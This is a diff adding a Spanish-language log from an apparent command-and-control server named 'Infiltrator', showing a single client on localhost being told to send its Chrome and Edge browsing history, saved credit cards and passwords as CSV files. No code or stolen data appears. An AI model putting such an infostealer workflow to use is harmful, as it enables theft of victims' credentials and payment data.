@@ -1,0 +1,22 @@
+-----------------------------------------------
+------ Welcome to Infiltrator Log System ------
+-----------------------------------------------
+[2024-08-02 13:20:55.906] - [INFO]: Configuración del servidor cargada correctamente.
+[2024-08-02 13:20:57.954] - [INFO]: Servidor Infiltrator iniciado en 127.0.0.1:443
+[2024-08-02 13:21:11.509] - [INFO]: Cliente 1 conectado.
+[2024-08-02 13:21:19.143] - [INFO]: Comando introducido: 1 chrome_history
+[2024-08-02 13:21:19.337] - [INFO]: Recibiendo archivo chrome_history.csv
+[2024-08-02 13:21:19.579] - [INFO]: Archivo 'chrome_history.csv' recibido y guardado correctamente.
+[2024-08-02 13:21:26.874] - [INFO]: Comando introducido: 1 chrome_ccs
+[2024-08-02 13:21:26.986] - [INFO]: Recibiendo archivo chrome_ccs.csv
+[2024-08-02 13:21:27.015] - [INFO]: Archivo 'chrome_ccs.csv' recibido y guardado correctamente.
+[2024-08-02 13:21:31.010] - [INFO]: Comando introducido: 1 chrome_passwords
+[2024-08-02 13:21:31.082] - [INFO]: Recibiendo archivo chrome_passwords.csv
+[2024-08-02 13:21:31.111] - [INFO]: Archivo 'chrome_passwords.csv' recibido y guardado correctamente.
+[2024-08-02 13:21:36.206] - [INFO]: Comando introducido: 1 edge_ccs
+[2024-08-02 13:21:36.380] - [INFO]: Recibiendo archivo edge_ccs.csv
+[2024-08-02 13:21:36.412] - [INFO]: Archivo 'edge_ccs.csv' recibido y guardado correctamente.
+[2024-08-02 13:21:40.817] - [INFO]: Comando introducido: 1 edge_passwords
+[2024-08-02 13:21:40.884] - [INFO]: Recibiendo archivo edge_passwords.csv
+[2024-08-02 13:21:40.914] - [INFO]: Archivo 'edge_passwords.csv' recibido y guardado correctamente.
+[2024-08-02 13:21:45.928] - [INFO]: Comando introducido: 1 edge_history
